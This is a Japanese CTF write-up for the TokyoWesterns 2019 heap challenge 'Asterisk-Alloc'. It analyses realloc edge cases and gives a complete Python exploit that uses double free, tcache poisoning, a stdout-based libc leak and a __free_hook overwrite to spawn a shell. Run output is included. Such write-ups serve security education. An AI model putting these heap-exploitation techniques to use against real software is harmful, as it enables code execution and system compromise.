# [pwn 221pts] Asterisk-Alloc - TokyoWesterns CTF 5th 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f asterisk_alloc
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   85 Symbols     Yes      0               4       asterisk_alloc
```

malloc, calloc, realloc, freeができます。
mallocされたものは`ptr_m`に、callocは`ptr_c`、reallocは`ptr_r`に入り、いずれもfreeでdouble freeでき、サイズも指定できます。
ただし、mallocとcallocはそれぞれ`ptr_m`, `ptr_r`がNULLでないと実行できないので、1度しか呼び出せません。
ということでreallocにすべてをかけるのですが、malloc.cを読んでみましょう。
```c
  /* realloc of null is supposed to be same as malloc */
  if (oldmem == 0)
    return __libc_malloc (bytes);
```
`ptr_r`がNULLであればreallocはmallocと等価に扱えます。
```c
  if (bytes == 0 && oldmem != NULL)
    {
      __libc_free (oldmem); return 0;
    }
```
サイズが0ならfreeして終了します。
問題はshow系の機能が無いということですが、ここはいつもの`_IO_2_1_stdout_`で乗り切りましょう。

mallocとcallocが1回ずつしか使えないので、reallocで何とかする必要があります。
reallocは負の値をサイズとして受け取ると特に何もせずNULLを返します。
したがって、次のように任意のアドレスを返すことができます。
```
r(0x80);
free(ptr_r);
r(0x0);
r(0x80);
*(unsigned long*)ptr_r = (unsigned long)&target;
r(-1);
r(0x80);
r(-1);
r(0x80);
```
`r(-1); r(size);`が実質`m(size);`と等価なので、これで勝ちです。

```python
from ptrlib import *

def malloc(size, data):
    sock.sendlineafter("Your choice: ", "1")
    sock.sendlineafter(": ", str(size))
    sock.sendafter(": ", data)
    return

def calloc(size, data):
    sock.sendlineafter("Your choice: ", "2")
    sock.sendlineafter(": ", str(size))
    sock.sendafter(": ", data)
    return

def realloc(size, data='A'):
    sock.sendlineafter("Your choice: ", "3")
    sock.sendlineafter(": ", str(size))
    if size > 0:
        sock.sendafter(": ", data)
    return

def free(name):
    sock.sendlineafter("Your choice: ", "4")
    sock.sendlineafter("Which: ", name)
    return

libc = ELF("./libc.so.6")
libc_one_gadget = 0x4f322

while True:
    sock = Process("./asterisk_alloc")

    # libc leak
    realloc(0x38, 'A'*0x38)
    realloc(0)
    realloc(0x28, 'B'*0x28)
    realloc(0)
    realloc(0x18, 'C'*0x18)
    realloc(0)

    realloc(-1)
    realloc(0x500, "r")
    calloc(0x500, 'A')
    free('r')

    realloc(-1)
    realloc(0x18, '\x00')
    free('r')
    free('r')
    free('r')
    realloc(-1)
    realloc(0x18, '\xe0')
    realloc(-1)
    realloc(0x18, p64(0) + p64(0x21)) # bypass realloc check
    realloc(-1)
    #realloc(0x18, p64(0) + p64(0x21) + b'\x60\x07\xdd') # for DEASLR
    realloc(0x18, p64(0) + p64(0x21) + b'\x60\x47')

    realloc(-1)
    realloc(0x28, 'A' * 0x28)
    free('r')
    free('r')
    free('r')
    realloc(-1)
    realloc(0x28, '\xf0')
    realloc(-1)
    realloc(0x28, b'X' * 0x18 + p64(0x21)) # bypass free check
    realloc(-1)
    realloc(0x28, '\x00' * 0x28)
    payload = p64(0xfbad1880)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += b'\x88'
    try:
        malloc(0x28, payload)
        libc_base = u64(sock.recv(8)) - libc.symbol("_IO_2_1_stdout_") - 131
        assert 0x7f0000000000 < libc_base < 0x800000000000
        logger.info("libc base = " + hex(libc_base))
    except:
        continue

    # tcache poisoning
    realloc(-1)
    realloc(0x38, 'A')
    free('r')
    free('r')
    free('r')
    realloc(-1)
    realloc(0x38, p64(libc_base + libc.symbol("__free_hook")))
    realloc(-1)
    realloc(0x38, 'A')
    realloc(-1)
    realloc(0x38, p64(libc_base + libc_one_gadget))

    # get the shell!
    free('r')

    sock.interactive()
    exit()
```

わーい。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=25572)
[+] __init__: Successfully created new process (PID=25573)
[+] close: close: './asterisk_alloc' killed
[+] <module>: libc base = 0x7f6fbdf38000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
面白かったです。
